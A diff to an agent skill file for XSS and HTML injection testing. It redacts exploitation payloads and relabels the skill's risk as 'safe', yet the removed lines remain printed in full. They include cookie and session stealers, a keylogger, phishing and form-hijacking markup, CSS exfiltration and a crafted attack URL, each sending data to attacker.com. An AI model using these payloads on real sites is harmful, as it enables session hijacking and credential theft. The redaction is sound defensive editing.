@@ -1,7 +1,7 @@
 ---
 name: xss-html-injection
 description: "Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms."
-risk: unknown
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -119,34 +119,16 @@ Target areas with persistent user content:
 
 ```html
 <!-- Cookie stealing payload -->
-<script>
-document.location='http://attacker.com/steal?c='+document.cookie
-</script>
+[REDACTED_COOKIE_STEALING_PAYLOAD]
 
 <!-- Keylogger injection -->
-<script>
-document.onkeypress=function(e){
-  new Image().src='http://attacker.com/log?k='+e.key;
-}
-</script>
+[REDACTED_KEYLOGGER_PAYLOAD]
 
 <!-- Session hijacking -->
-<script>
-fetch('http://attacker.com/capture',{
-  method:'POST',
-  body:JSON.stringify({cookies:document.cookie,url:location.href})
-})
-</script>
+[REDACTED_SESSION_HIJACKING_PAYLOAD]
 
 <!-- Phishing form injection -->
-<div id="login">
-<h2>Session Expired - Please Login</h2>
-<form action="http://attacker.com/phish" method="POST">
-Username: <input name="user"><br>
-Password: <input type="password" name="pass"><br>
-<input type="submit" value="Login">
-</form>
-</div>
+[REDACTED_PHISHING_FORM_PAYLOAD]
 ```
 
 ### Phase 3: Reflected XSS Exploitation
@@ -242,19 +224,13 @@ Modify page appearance without JavaScript:
 <h1>SITE HACKED</h1>
 
 <!-- Form hijacking -->
-<form action="http://attacker.com/capture">
-<input name="credentials" placeholder="Enter password">
-<button>Submit</button>
-</form>
+[REDACTED_FORM_HIJACKING_PAYLOAD]
 
 <!-- CSS injection for data exfiltration -->
-<style>
-input[value^="a"]{background:url(http://attacker.com/a)}
-input[value^="b"]{background:url(http://attacker.com/b)}
-</style>
+[REDACTED_CSS_INJECTION_PAYLOAD]
 
 <!-- iframe injection -->
-<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
+[REDACTED_IFRAME_INJECTION_PAYLOAD]
 ```
 
 #### Stored HTML Injection
@@ -370,24 +346,12 @@ Fake login form or misleading content here
 
 ### Cookie Theft Payload
 ```javascript
-<script>
-new Image().src='http://attacker.com/c='+btoa(document.cookie);
-</script>
+[REDACTED_COOKIE_THEFT_PAYLOAD]
 ```
 
 ### Session Hijacking Template
 ```javascript
-<script>
-fetch('https://attacker.com/log',{
-  method:'POST',
-  mode:'no-cors',
-  body:JSON.stringify({
-    cookies:document.cookie,
-    localStorage:JSON.stringify(localStorage),
-    url:location.href
-  })
-});
-</script>
+[REDACTED_SESSION_HIJACKING_TEMPLATE]
 ```
 
 ## Constraints and Guardrails
@@ -428,10 +392,7 @@ Content-Type: application/json
 
 **Exploitation Payload**:
 ```html
-<script>
-var i = new Image();
-i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
-</script>
+[REDACTED_STORED_XSS_PAYLOAD]
 ```
 
 **Result**: Every user viewing the comment has their session cookie sent to attacker's server.
@@ -452,7 +413,7 @@ https://shop.example.com/search?q=<script>alert(document.domain)</script>
 
 **Crafted Attack URL**:
 ```
-https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
+[REDACTED_CRAFTED_ATTACK_URL]
 ```
 
 **Delivery**: URL sent via phishing email to target user.
